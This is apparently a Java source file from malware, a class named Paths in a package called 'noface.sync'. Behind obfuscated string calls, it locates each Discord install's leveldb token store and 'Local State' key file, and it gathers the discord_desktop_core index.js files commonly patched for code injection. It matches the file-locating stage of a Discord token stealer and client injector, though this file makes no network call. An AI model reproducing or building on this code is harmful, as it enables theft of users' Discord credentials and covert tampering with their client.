package noface.sync;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public final class Paths {

    public record Install(String name, Path base) {
        public Path ldb() {
            return base.resolve(S.e("Local Storage")).resolve(S.e("leveldb"));
        }

        public Path localState() {
            return base.resolve(S.e("Local State"));
        }
    }

    public static Install[] installs() {
        String appData = env(S.e("APPDATA"));
        return new Install[]{
                new Install(S.e("Discord"), Path.of(appData, S.e("Discord"))),
                new Install(S.e("DiscordCanary"), Path.of(appData, S.e("discordcanary"))),
                new Install(S.e("DiscordPTB"), Path.of(appData, S.e("discordptb"))),
                new Install(S.e("DiscordDevelopment"), Path.of(appData, S.e("discorddevelopment"))),
        };
    }

    public static List<Path> indexFiles() {
        String local = env(S.e("LOCALAPPDATA"));
        List<Path> found = new ArrayList<>();
        for (String folder : new String[]{
                S.e("Discord"),
                S.e("discordcanary"),
                S.e("discordptb"),
                S.e("discorddevelopment")
        }) {
            Path base = Path.of(local, folder);
            if (!Files.isDirectory(base)) continue;
            try (var apps = Files.list(base)) {
                apps.filter(p -> p.getFileName().toString().startsWith(S.e("app-")))
                        .forEach(app -> collectIndex(app, found));
            } catch (Exception ignored) {}
        }
        return found;
    }

    private static void collectIndex(Path appDir, List<Path> found) {
        Path modules = appDir.resolve(S.e("modules"));
        if (!Files.isDirectory(modules)) return;
        String coreName = S.e("discord_desktop_core");
        try (var cores = Files.list(modules)) {
            cores.filter(p -> p.getFileName().toString().startsWith(coreName))
                    .forEach(core -> {
                        Path index = core.resolve(coreName).resolve(S.e("index.js"));
                        if (Files.isRegularFile(index)) found.add(index);
                    });
        } catch (Exception ignored) {}
    }

    private static String env(String key) {
        String v = System.getenv(key);
        return v == null ? "" : v;
    }

    private Paths() {}
}
